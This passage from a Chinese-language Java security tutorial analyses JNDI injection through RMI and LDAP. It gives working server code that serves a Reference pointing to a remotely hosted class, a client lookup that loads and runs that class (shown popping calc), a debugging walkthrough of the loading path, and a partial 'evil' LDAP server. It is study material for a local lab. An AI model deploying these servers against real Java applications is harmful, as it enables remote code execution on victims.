</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:7979/&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="n">1099</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reference</span><span class="w"> </span><span class="n">reference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Reference</span><span class="p">(</span><span class="s">&#34;JNDI_Main&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;JNDI_Main&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">reference</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;Hello&#34;</span><span class="p">,</span><span class="n">referenceWrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;running&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里需要将前面的<code>Reference</code>对象传进<code>ReferenceWrapper</code>，这是因为Reference类没有实现Remote接口也没有继承<code>UnicastRemoteObject</code>类，所以这里用<code>ReferenceWrapper</code>类将其封装了一下。</p>
<ul>
<li>RMIClient端代码：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_RMI_Client</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;rmi://localhost:1099/Hello&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InitialContext</span><span class="w"> </span><span class="n">initialContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initialContext</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="n">url</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>然后需要准备一个远程加载的类：</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.Runtime</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDI_Main</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">JNDI_Main</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;calc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//注意这里不能有包名，自己本地打踩了一下坑，也许其他环境不会有这个问题</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>然后使用javac命令将这个文件打成class文件，然后再用python起一个HTTP服务：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">7979</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102155908.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010215558859"
	
	
></p>
<p>然后运行Server端，再运行Client发起请求，成功弹出计算机：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102225661.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010222559605"
	
	
></p>
<p>原理简单来说就是把引用了恶意类的<code>Reference</code>类绑定到RMI的Registry中。</p>
<p>在客户端调用<code>lookup</code>远程获取远程类的时候，就会获取到<code>Reference</code>对象，就会去寻找<code>Reference</code>中指定的类，如果查找不到则会在<code>Reference</code>中指定的远程地址去进行请求，请求到远程的类后会在本地执行。</p>
<p>这里其实算攻击客户端。</p>
<h4 id="代码调试">代码调试
</h4><h5 id="jndi_rmi_server端">JNDI_RMI_Server端
</h5><p>大致还是和RMI服务端的创建是差不多的，主要是为了看看引用类中的赋值情况。</p>
<p>大概看了一下，Reference类还是和前面说的差不多，主要看看ReferenceWrapper的赋值情况：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102252041.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010225250972"
	
	
></p>
<p>也就是将这里的wrapper变量赋值为Reference类。</p>
<p>稍微关注一下这里的getReference()方法。</p>
<p><strong>最后在注册表中将RMI服务和ReferenceWrapper对象绑定在一起。</strong></p>
<h5 id="jndi_rmi_client端">JNDI_RMI_Client端
</h5><p>打断点于lookup()方法，所以现在会调用InitialContext类的lookup()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410102257752.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241010225755694"
	
	
></p>
<p>前面一部分其实是和RMI服务动态协议转换那里差不多的，主要从不同的地方说起，直接到调用RegistryImpl_Stub类的lookup()方法结束：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111450341.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011145033242"
	
	
></p>
<p>此时的变量情况：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111452926.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011145220852"
	
	
></p>
<p>在前面的RMI接口实现中分析这里在调用lookup()方法后会得到代理对象，但是如上图所示，这里会得到一个ReferenceWrapper_Stub类，跟进这里的decodeObject()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111455243.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011145542192"
	
	
></p>
<p>这里的ReferenceWrapper_Stub类实现了RemoteReference接口，所以这里会调用ReferenceWrapper_Stub类的getReference()方法：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111459839.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011145936768"
	
	
></p>
<p>这里又调用了UnicastRef类的invoke()方法进行数据传输，得到了Reference对象并将其返回，所以现在var的值为：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111500986.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011150043944"
	
	
></p>
<p>然后又调用了NamingManager类的getObjectInstance()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111514596.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011151417551"
	
	
></p>
<p>变量情况：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111515873.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011151520821"
	
	
></p>
<p>跟进NamingManager类的getObjectInstance()方法：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111533494.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011153309439"
	
	
></p>
<p>部分代码，每部分都分析一下：</p>
<p>这里会调用getObjectFactoyBuilder()方法，这里就是会返回变量的值，但是这里的值默认为null，所以不会进入后面的if条件。</p>
<p>看后面的代码：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111534453.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011153459393"
	
	
></p>
<p>refInfo就是参数传递的Reference类，符合第一个if条件，所以现在会将ref变量赋值为这个Reference类。</p>
<p>再往后面看，会进入第一个if语句，会将f赋值为前面Reference类初始化时传的参，如下：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111537063.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011153722021"
	
	
></p>
<p>即要初始化的类。</p>
<p>所以现在会进入第二个if条件：</p>
<p>所以现在会调用getObjectFactoryFromReference()方法（注意传入了Reference类和这个classFactory）：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111542266.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011154249208"
	
	
></p>
<p>可以看到有加载类的操作，也就是恶意类JNDI_Main。在第二个loadClass()方法获取到了JNDI_Main类的class对象，第一个应该是先在本地找，找不到就去工厂路径找：</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250402162855229.png"
	
	
	
	loading="lazy"
	
		alt="image-20250402162855229"
	
	
></p>
<p>并且后面有实例化类的操作：
<img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111759752.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011175917664"
	
	
></p>
<p>很明显会实例化类成功调用恶意方法。</p>
<p>在弹计算机后就进入异常输出，整个过程结束：</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202410111805417.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20241011180520366"
	
	
></p>
<h3 id="jndi-ldap注入">JNDI-Ldap注入
</h3><p>LDAP也是一种目录服务，前面分析的DNS其实只用客户端就能完成一次完整的服务，在这里我们可以利用LDAP这个目录服务来完成一次攻击。</p>
<p>思路是差不多的，当查询属性的值时，我们返回一个存储恶意类的Reference类给客户端，让客户端根据codebase路径查找工厂。</p>
<p>需要用需要引入unboundid-ldapsdk-3.2.0.jar包，直接在pom.xml引入即可：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.unboundid<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>unboundid-ldapsdk<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.2.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;scope&gt;</span>test<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="基本代码-2">基本代码
</h4><p>恶意LDAP服务端：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">JNDI</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.LDAPException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ServerSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.SocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.InetAddress</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.MalformedURLException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LDAP_EVIL_Server</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">LDAP_BASE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;dc=example,dc=com&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">tmp_args</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;http://127.0.0.1:8888/#Test&#34;</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">2333</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InMemoryDirectoryServerConfig</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServerConfig</span><span class="p">(</span><span class="n">LDAP_BASE</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">setListenerConfigs</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryListenerConfig</span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="s">&#34;listen&#34;</span><span class="p">,</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">InetAddress</span><span class="p">.</span><span class="na">getByName</span><span class="p">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="p">),</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">port</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">ServerSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">SocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">(</span><span class="n">SSLSocketFactory</span><span class="p">)</span><span class="w"> </span><span class="n">SSLSocketFactory</span><span class="p">.</span><span class="na">getDefault</span><span class="p">()));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">config</span><span class="p">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">OperationInterceptor</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="n">args</span><span class="o">[</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">]</span><span class="p">)));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InMemoryDirectoryServer</span><span class="w"> </span><span class="n">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InMemoryDirectoryServer</span><span class="p">(</span><span class="n">config</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">port</span><span class="p">);</span><span class="w"> </span><span class="c1">//$NON-NLS-1$</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ds</span><span class="p">.</span><span class="na">startListening</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">class</span> <span class="nc">OperationInterceptor</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">InMemoryOperationInterceptor</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">private</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">codebase</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="nf">OperationInterceptor</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">cb</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">codebase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cb</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">processSearchResult</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="na">getRequest</span><span class="p">().</span><span class="na">getBaseDN</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Entry</span><span class="p">(</span><span class="n">base</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">sendResult</span><span class="p">(</span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">e1</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">e1</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">sendResult</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">InMemoryInterceptedSearchResult</span><span class="w"> </span><span class="n">result</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">base</span><span class="p">,</span><span class="w"> </span><span class="n">Entry</span><span class="w"> </span><span class="n">e</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">LDAPException</span><span class="p">,</span><span class="w"> </span><span class="n">MalformedURLException</span><span class="w"> </span><span class="p">{</span><span class="w">
